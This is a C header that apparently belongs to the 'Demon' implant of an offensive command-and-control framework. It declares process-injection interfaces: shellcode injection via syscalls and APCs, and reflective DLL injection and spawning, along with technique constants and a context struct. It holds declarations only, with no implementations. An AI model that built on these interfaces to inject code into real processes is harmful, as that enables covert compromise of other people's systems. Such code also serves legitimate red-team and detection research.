
#ifndef DEMON_BASEINJECT_H
#define DEMON_BASEINJECT_H

#include <Demon.h>

#include <Core/Memory.h>
#include <Core/Thread.h>

#define INJECTION_TECHNIQUE_WIN32           1
#define INJECTION_TECHNIQUE_SYSCALL         2
#define INJECTION_TECHNIQUE_APC             3

#define SPAWN_TECHNIQUE_SYSCALL             2
#define SPAWN_TECHNIQUE_APC                 3

// defaults
#define SPAWN_TECHNIQUE_DEFAULT             SPAWN_TECHNIQUE_SYSCALL
#define INJECTION_TECHNIQUE_DEFAULT         INJECTION_TECHNIQUE_SYSCALL

typedef enum _DX_CREATE_THREAD
{
    DX_THREAD_DEFAULT           = 0,
    DX_THREAD_WIN32             = 1,
    DX_THREAD_SYSCALL           = 2,
    DX_THREAD_APC               = 3,
    DX_THREAD_WOW               = 4,
    DX_THREAD_SYSAPC            = 5,
} DX_THREAD;

typedef struct INJECTION_CTX
{
    HANDLE  hProcess;
    DWORD   ThreadID;
    DWORD   ProcessID;
    HANDLE  hThread;
    SHORT   Arch;
    BOOL    PipeStdout;

    BOOL    SuspendAwake;
    LPVOID  Parameter;
    UINT32  ParameterSize;

    SHORT   Technique;
} INJECTION_CTX, *PINJECTION_CTX ;

/* injection errors */
#define INJECT_ERROR_SUCCESS                0   /* no error. successful executed */
#define INJECT_ERROR_FAILED                 1   /* aborted while trying to execute function */
#define INJECT_ERROR_INVALID_PARAM          2   /* invalid param */
#define INJECT_ERROR_PROCESS_ARCH_MISMATCH  3   /* process arch mismatches the injection arch */

#define INJECT_WAY_SPAWN   0
#define INJECT_WAY_INJECT  1
#define INJECT_WAY_EXECUTE 2

DWORD Inject(
    IN BYTE   Method,
    IN HANDLE Handle,
    IN DWORD  Pid,
    IN BOOL   x64,
    IN PVOID  Payload,
    IN SIZE_T Size,
    IN UINT64 Offset,
    IN PVOID  Argv,
    IN SIZE_T Argc
);

// ShellcodeInjectDispatch
BOOL  ShellcodeInjectDispatch( BOOL Inject, SHORT InjectionMethod, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );
BOOL  ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );
BOOL  ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );

DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSize, LPVOID lpDllBuffer, DWORD dwDllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx );
DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID lpDllBuffer, DWORD dwDllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx );

#endif
